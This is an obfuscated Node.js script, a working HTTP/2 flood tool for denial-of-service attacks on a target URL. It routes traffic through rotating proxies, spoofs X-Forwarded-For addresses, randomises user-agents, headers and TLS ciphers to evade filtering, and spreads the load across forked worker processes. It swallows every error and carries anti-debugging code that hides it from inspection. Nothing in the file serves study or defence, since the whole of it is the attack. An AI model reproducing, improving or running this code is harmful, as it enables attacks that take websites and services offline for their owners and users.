const duriel = enzzo;
(function (emirah, mariasha) {
  const melodia = enzzo, daniale = emirah();
  while (true) {
    try {
      const trayce = -parseInt(melodia(542)) / 1 + -parseInt(melodia(524)) / 2 * (-parseInt(melodia(515)) / 3) + -parseInt(melodia(476)) / 4 + -parseInt(melodia(489)) / 5 * (-parseInt(melodia(539)) / 6) + -parseInt(melodia(544)) / 7 * (-parseInt(melodia(516)) / 8) + -parseInt(melodia(522)) / 9 + parseInt(melodia(479)) / 10;
      if (trayce === mariasha) break; else daniale.push(daniale.shift());
    } catch (allisa) {
      daniale.push(daniale.shift());
    }
  }
}(chloejane, 548197));
const clemontine = function () {
  let anteo = true;
  return function (sand, koral) {
    const abdulkhaliq = anteo ? function () {
      if (koral) {
        const alwillie = koral.apply(sand, arguments);
        return koral = null, alwillie;
      }
    } : function () {};
    return anteo = false, abdulkhaliq;
  };
}(), kinshasha = clemontine(this, function () {
  const dimesha = enzzo;
  return kinshasha[dimesha(494)]()[dimesha(510)](dimesha(541)).toString()[dimesha(452)](kinshasha)[dimesha(510)]("(((.+)+)+)+$");
});
kinshasha();
const caylon = function () {
  let gavina = true;
  return function (vastie, rakem) {
    const khimora = gavina ? function () {
      const oshae = enzzo;
      if (rakem) {
        const kiahnna = rakem[oshae(545)](vastie, arguments);
        return rakem = null, kiahnna;
      }
    } : function () {};
    return gavina = false, khimora;
  };
}(), corianna = caylon(this, function () {
  const semyon = enzzo;
  let reinold;
  try {
    const fabrizzio = Function(semyon(526) + '{}.constructor("return this")( )' + ");");
    reinold = fabrizzio();
  } catch (auryn) {
    reinold = window;
  }
  const latishia = reinold[semyon(488)] = reinold[semyon(488)] || {}, dmarko = [semyon(513), semyon(535), semyon(518), "error", semyon(471), semyon(453), "trace"];
  for (let kyjaun = 0; kyjaun < dmarko[semyon(523)]; kyjaun++) {
    const saraya = caylon.constructor[semyon(484)][semyon(551)](caylon), shikera = dmarko[kyjaun], yohei = latishia[shikera] || saraya;
    saraya[semyon(550)] = caylon[semyon(551)](caylon), saraya.toString = yohei.toString[semyon(551)](yohei), latishia[shikera] = saraya;
  }
});
corianna();
const url = require(duriel(466)), fs = require("fs"), http2 = require("http2"), http = require(duriel(483)), tls = require("tls"), net = require(duriel(536)), request = require(duriel(463)), cluster = require(duriel(454)), fakeua = require(duriel(504)), randstr = require(duriel(543)), cplist = [duriel(449), "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", duriel(547), "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", duriel(501), duriel(503)], accept_header = [duriel(457), duriel(459), "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", duriel(506)], lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", duriel(538), "en-US,en;q=0.5", duriel(473), duriel(464), duriel(508), duriel(496)], encoding_header = [duriel(498), duriel(528), "*"], controle_header = [duriel(486), duriel(497), duriel(520), duriel(546), duriel(468)], ignoreNames = [duriel(532), duriel(499), "CaptchaError", duriel(549), duriel(521), duriel(540)], ignoreCodes = [duriel(470), duriel(527), duriel(509), duriel(531), duriel(467), duriel(534), duriel(461), duriel(517), duriel(512)];
function chloejane() {
  const jadison = ["return (function() ", "ECONNRESET", "gzip, deflate, br", "unhandledRejection", "host", "ECONNREFUSED", "RequestError", "round", "EHOSTUNREACH", "warn", "net", "setEncoding", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "72meiKsH", "ParserError", "(((.+)+)+)+$", "284875EICBte", "randomstring", "3082303ojDEVc", "apply", "only-if-cached", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", ":443", "CloudflareError", "__proto__", "bind", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "http1.1", "match", "constructor", "table", "cluster", "fork", "setSocketKeepAlive", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "CONNECT", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "connect", "ETIMEDOUT", "close", "request", "de-CH;q=0.7", "GET", "url", "EPIPE", "max-age=0", "jar", "SELF_SIGNED_CERT_IN_CHAIN", "exception", "TLSv1_3_method", "en-US,en;q=0.9", "href", "generate", "2341944hmsTBp", "Keep-Alive", "response", "905880plyWqK", "floor", "warning", "utf8", "http", "prototype", "readFileSync", "no-cache", "https", "console", "44510xITfxj", "GREASE:X25519:x25519", "argv", "012345", "end", "toString", "test", "cs;q=0.5", "no-store", "deflate, gzip;q=1.0, *;q=0.5", "StatusCodeError", "Your Target: ", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", " | RPS: ", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK", "fake-useragent", "random", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "TLSv1_1_method", "da, en-gb;q=0.8, en;q=0.7", "ERR_ASSERTION", "search", "Agent", "EPROTO", "log", " | Threads: ", "6hpbiKv", "8NHjfbs", "ESOCKETTIMEDOUT", "info", "split", "no-transform", "ParseError", "1366173SIgtlF", "length", "932614COQjLI", " by 3ixy"];
  chloejane = function () {
    return jadison;
  };
  return chloejane();
}
process.on("uncaughtException", function (ceyda) {}).on(duriel(529), function (yasamin) {}).on(duriel(481), kymori => {}).setMaxListeners(0);
function accept() {
  const biatris = duriel;
  return accept_header[Math[biatris(480)](Math[biatris(505)]() * accept_header[biatris(523)])];
}
function lang() {
  const alexxia = duriel;
  return lang_header[Math[alexxia(480)](Math.random() * lang_header[alexxia(523)])];
}
function encoding() {
  const krissie = duriel;
  return encoding_header[Math[krissie(480)](Math.random() * encoding_header[krissie(523)])];
}
function controling() {
  const lava = duriel;
  return controle_header[Math[lava(480)](Math[lava(505)]() * controle_header.length)];
}
function cipher() {
  const stephaun = duriel;
  return cplist[Math[stephaun(480)](Math.random() * cplist[stephaun(523)])];
}
function spoof() {
  const kimberlie = duriel;
  return "" + randstr[kimberlie(475)]({length: 1, charset: "12"}) + randstr[kimberlie(475)]({length: 1, charset: kimberlie(492)}) + randstr[kimberlie(475)]({length: 1, charset: "012345"}) + "." + randstr.generate({length: 1, charset: "12"}) + randstr[kimberlie(475)]({length: 1, charset: kimberlie(492)}) + randstr.generate({length: 1, charset: "012345"}) + "." + randstr.generate({length: 1, charset: "12"}) + randstr[kimberlie(475)]({length: 1, charset: kimberlie(492)}) + randstr[kimberlie(475)]({length: 1, charset: kimberlie(492)}) + "." + randstr[kimberlie(475)]({length: 1, charset: "12"}) + randstr[kimberlie(475)]({length: 1, charset: kimberlie(492)}) + randstr[kimberlie(475)]({length: 1, charset: kimberlie(492)});
}
function enzzo(rigby, nthony) {
  const menah = chloejane();
  return enzzo = function (nadeya, latiffa) {
    nadeya = nadeya - 449;
    let colby = menah[nadeya];
    return colby;
  }, enzzo(rigby, nthony);
}
function randomByte() {
  const shynell = duriel;
  return Math[shynell(533)](Math[shynell(505)]() * 256);
}
function randomIp() {
  const eldric = randomByte() + "." + randomByte() + "." + randomByte() + "." + randomByte();
  return isPrivate(eldric) ? eldric : randomIp();
}
function isPrivate(kimarley) {
  const josiha = duriel;
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/[josiha(495)](kimarley);
}
const target = process[duriel(491)][2], time = process[duriel(491)][3], thread = process[duriel(491)][4], proxys = fs[duriel(485)](process.argv[5], "utf-8")[duriel(494)]()[duriel(451)](/\S+/g), rps = process[duriel(491)][6];
function proxyr() {
  const jemell = duriel;
  return proxys[Math.floor(Math[jemell(505)]() * proxys[jemell(523)])];
}
if (cluster.isMaster) {
  const dateObj = new Date;
  console[duriel(513)](duriel(500) + target + duriel(514) + thread + duriel(502) + rps + duriel(525));
  for (var bb = 0; bb < thread; bb++) {
    cluster[duriel(455)]();
  }
  setTimeout(() => {
    process.exit(-1);
  }, time * 1e3);
} else {
  function flood() {
    const latanza = duriel;
    var aquilina = url.parse(target);
    const banessa = fakeua();
    var ausencio = cipher(), killian = proxyr()[latanza(519)](":"), sumeyye = request[latanza(469)](), lariah = randomIp(), emarion = {":method": latanza(465), ":authority": aquilina[latanza(530)], ":path": aquilina.path, ":scheme": latanza(487), "X-Forwarded-For": lariah, "user-agent": banessa, Origin: target, accept: accept(), "accept-encoding": encoding(), "accept-language": lang(), referer: target, "cache-control": "max-age=0"};
    const semaiah = new http[latanza(511)]({keepAlive: true, keepAliveMsecs: 5e4, maxSockets: Infinity, maxTotalSockets: Infinity, maxSockets: Infinity});
    var mackynzie = http.request({host: killian[0], agent: semaiah, globalAgent: semaiah, port: killian[1], headers: {Host: aquilina[latanza(530)], "Proxy-Connection": latanza(477), Connection: "Keep-Alive"}, method: latanza(458), path: aquilina[latanza(530)] + latanza(548)}, function () {
      const leovonni = latanza;
      mackynzie[leovonni(456)](true);
    }).on("error", () => {});
    mackynzie.on(latanza(460), function (deep, eboni, mickaylah) {
      const nsombi = latanza, mariena = tls[nsombi(460)]({host: aquilina[nsombi(530)], port: 443, servername: aquilina[nsombi(530)], followAllRedirects: true, maxRedirects: 5, secureProtocol: [nsombi(507), "TLSv1_2_method", nsombi(472)], echdCurve: nsombi(490), secure: true, honorCipherOrder: true, rejectUnauthorized: false, sessionTimeout: 5e3, ALPNProtocols: ["h2", nsombi(450)], sessionTimeout: 5e3, socket: eboni}, () => {
        const itan = nsombi, analiha = http2.connect(aquilina[itan(474)], {createConnection: () => mariena, settings: {headerTableSize: 65536, maxConcurrentStreams: 1e3, initialWindowSize: 6291456, maxHeaderListSize: 262144, enablePush: false}}, function (sthefani) {
          const irani = itan;
          for (let brantley = 0; brantley < rps; brantley++) {
            const sueno = sthefani[irani(463)](emarion);
            sueno[irani(537)](irani(482)), sueno.on("data", jolea => {}), sueno.on(irani(478), samir => {
              const mayar = irani;
              sueno[mayar(462)]();
            }), sueno[irani(493)]().on("error", () => {});
          }
        });
      });
    }), mackynzie[latanza(493)]();
  }
  setInterval(() => {
    flood();
  });
}
